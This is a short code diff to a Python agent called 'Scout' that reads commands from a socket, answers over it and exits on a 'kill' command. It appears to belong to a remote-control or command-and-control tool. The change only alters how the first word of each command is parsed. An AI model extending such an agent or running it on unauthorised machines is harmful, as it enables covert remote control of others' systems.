@@ -63,7 +63,8 @@ while True:
             command = ""
             for command_string in data:
                 command = command + command_string + " "
-            command = command.strip()
+            data = command.strip()
+            command = data.split(" ")[0]
             if command == 'kill':
                 s.sendall('[*]Scout is killing itself...'.encode())
                 _exit(1)
@@ -139,7 +140,8 @@ while True:
             command = ""
             for command_string in data:
                 command = command + command_string + " "
-            command = command.strip()
+            data = command.strip()
+            command = data.split(" ")[0]
             if command == 'kill':
                 s.sendall('[*]Scout is killing itself...'.encode())
                 _exit(1)
